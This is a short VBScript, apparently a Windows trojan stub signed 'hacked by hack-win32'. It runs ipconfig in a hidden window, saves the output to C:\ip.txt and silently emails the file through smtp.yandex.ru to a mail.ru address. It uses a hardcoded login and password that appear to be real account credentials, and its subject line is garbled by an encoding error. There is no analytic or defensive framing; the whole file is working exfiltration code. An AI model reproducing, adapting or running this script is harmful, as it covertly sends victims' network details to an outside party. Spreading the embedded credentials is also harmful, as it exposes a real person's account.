Set WshShell = CreateObject("WScript.Shell") 
WshShell.Run "cmd.exe /c ipconfig > C:\ip.txt", 0, false 

WScript.Sleep (5000)

Set S = CreateObject("Wscript.Shell")
set FSO=createobject("scripting.filesystemobject")
Call SendPost("smtp.yandex.ru","san16ek@mail.ru","sasha-samarin@yandex.ru","IP ������","hacked by hack-win32")
Function SendPost(strSMTP_Server,strTo,strFrom,strSubject,strBody)
Set iMsg=CreateObject("CDO.Message")
Set iConf=CreateObject("CDO.Configuration")
Set Flds=iConf.Fields
Flds.Item("http://schemas.microsoft.com/cdo/configuration/sendusing")=2
Flds.Item("http://schemas.microsoft.com/cdo/configuration/smtpauthenticate")=1
Flds.Item("http://schemas.microsoft.com/cdo/configuration/sendusername")="sasha-samarin"
Flds.Item("http://schemas.microsoft.com/cdo/configuration/sendpassword")="1994"
Flds.Item("http://schemas.microsoft.com/cdo/configuration/smtpserver")="smtp.yandex.ru"
Flds.Item("http://schemas.microsoft.com/cdo/configuration/smtpserverport")=25
Flds.Update
iMsg.Configuration=iConf
iMsg.To=strTo
iMsg.From=strFrom
iMsg.Subject=strSubject
iMsg.TextBody=strBody
iMsg.AddAttachment "C:\ip.txt"
iMsg.Send
End Function
Set iMsg=Nothing
Set iConf=Nothing
Set Flds=Nothing